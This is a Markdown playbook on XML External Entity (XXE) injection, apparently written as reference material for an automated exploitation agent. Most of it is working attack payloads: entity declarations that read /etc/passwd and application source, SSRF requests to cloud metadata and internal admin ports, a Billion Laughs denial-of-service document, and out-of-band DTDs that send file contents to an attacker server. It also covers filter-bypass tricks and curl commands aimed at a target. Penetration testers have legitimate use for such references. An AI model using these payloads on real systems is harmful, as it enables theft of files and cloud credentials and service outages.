---
vuln_type: xxe
severity: high
cwe: [CWE-611]
owasp: A05:2021-Security-Misconfiguration
related_tools: [curl, interactsh]
exploit_agent: xxe_agent
tags: [xxe, xml, external-entity, dtd, ssrf, file-read, rce, blind-xxe, oob]
---

# XML External Entity Injection (XXE)

## Overview
Occurs when an XML parser processes external entity references in user-supplied XML without disabling DTD processing. Allows reading local files, SSRF, denial of service, and in some cases Remote Code Execution.

---

## Injection Points

| Location | Example | Notes |
|----------|---------|-------|
| XML POST body | `Content-Type: application/xml` | Most common |
| SOAP endpoints | `Content-Type: text/xml` | Enterprise/legacy apps |
| SVG upload | SVG files are XML | Image upload features |
| XLSX/DOCX upload | Office files contain XML | File import features |
| RSS/Atom feeds | XML-based feed processing | Feed aggregators |
| SAML responses | XML-based auth assertions | SSO implementations |
| XML-RPC | `Content-Type: text/xml` | WordPress xmlrpc.php |
| XSLT processing | Stylesheet transformation | Report generators |
| sitemap.xml processing | XML sitemap import | SEO tools |

---

## Detection Techniques

### Step 1: Identify XML processing
- Look for `Content-Type: application/xml` or `text/xml` in requests
- Look for XML-like input fields
- Test if changing `Content-Type: application/json` to `application/xml` is accepted
- Check for file upload accepting SVG, XLSX, DOCX, XML

### Step 2: Test basic entity expansion
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe "XXE_TEST_STRING">
]>
<root>&xxe;</root>
```
If `XXE_TEST_STRING` appears in the response → entity processing is enabled.

### Step 3: Test external entity
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://YOUR_INTERACTSH_URL">
]>
<root>&xxe;</root>
```
If callback received → external entities work.

---

## Exploitation

### 1. Local File Read

**Linux:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Windows:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>&xxe;</root>
```

**PHP source code (base64 to handle special chars):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```

### 2. SSRF via XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<root>&xxe;</root>
```

### 3. Denial of Service (Billion Laughs)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```
**Warning:** This expands to ~3GB of data. Use only if DoS is in scope.

---

## Blind XXE (Out-of-Band)

When the application processes XML but doesn't reflect entity values in the response.

### Method 1: Parameter Entity + External DTD

**Payload sent to target:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**evil.dtd on attacker server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
%eval;
%exfil;
```

**How it works:**
1. Target fetches `evil.dtd` from attacker
2. `%file;` reads `/etc/passwd`
3. `%eval;` constructs a new entity that sends file content to attacker
4. `%exfil;` triggers the request with data

### Method 2: Error-Based XXE

**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
File content appears in the XML parsing error message.

### Method 3: XInclude (when you can't control the DTD)

When your input is inserted into an existing XML document:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## XXE via File Upload

### SVG (image upload)
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### XLSX (spreadsheet upload)
1. Create a valid `.xlsx` file
2. Unzip it (xlsx is a zip of XML files)
3. Edit `xl/sharedStrings.xml` or `[Content_Types].xml`:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
...
<si><t>&xxe;</t></si>
```
4. Rezip and upload

### DOCX (document upload)
Same approach — unzip, inject entity in `word/document.xml`, rezip.

---

## XXE in SOAP Requests

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <username>&xxe;</username>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

---

## Content-Type Switching

Some APIs accept both JSON and XML. Try changing:
```
# Original request
POST /api/user HTTP/1.1
Content-Type: application/json

{"name": "test"}

# Modified to XML
POST /api/user HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><name>&xxe;</name></root>
```

---

## Bypass Techniques

### ENTITY keyword blocked
```xml
<!-- Use parameter entities only -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">
  %xxe;
]>
```

### DOCTYPE blocked
```xml
<!-- XInclude (no DOCTYPE needed) -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### Protocol filtering (file:// blocked)
```xml
<!-- Try other protocols -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">        <!-- Java -->
<!ENTITY xxe SYSTEM "jar:file:///tmp/test.jar!/test.txt">  <!-- Java -->
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/...">
```

### Encoding bypass
```xml
<!-- UTF-16 encoding -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- UTF-7 encoding -->
<?xml version="1.0" encoding="UTF-7"?>
```

### File read with special characters
Files containing `<`, `>`, `&` will break XML parsing. Use:
```xml
<!-- CDATA wrapper via parameter entities -->
<!-- evil.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>">
%wrapper;

<!-- Payload: -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
  %dtd;
]>
<root>&all;</root>
```

Or use Base64 encoding:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/fstab">
```

---

## Automated Testing

```bash
# Basic XXE test
curl -X POST http://target/api -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Blind XXE with OOB
curl -X POST http://target/api -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR_INTERACTSH_URL">%xxe;]><root>test</root>'

# Content-Type switching test
curl -X POST http://target/api -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "test123">]><root><name>&xxe;</name></root>'

# SVG upload
curl -X POST http://target/upload -F "file=@xxe.svg;type=image/svg+xml"
```

---

## Output Interpretation

### Confirmed XXE indicators
- File content (`root:x:0:0:...`) in response
- OOB callback received from target server
- XML parsing error containing file content (error-based)
- Cloud metadata returned via SSRF entity
- Internal service response in entity value

### Not XXE (false positives)
- XML parsing error but entities not processed
- Application accepts XML but `DOCTYPE` declaration is stripped/ignored
- Entity defined but not expanded in output

### Severity assessment
- **Critical**: File read + SSRF to cloud metadata (credential theft)
- **Critical**: RCE via XXE (rare — requires `expect://` or XSLT command execution)
- **High**: Arbitrary file read (config files, source code, credentials)
- **High**: SSRF to internal services via XXE
- **Medium**: Blind XXE confirmed (OOB) but limited exfiltration
- **Low**: Entity expansion DoS only (Billion Laughs)
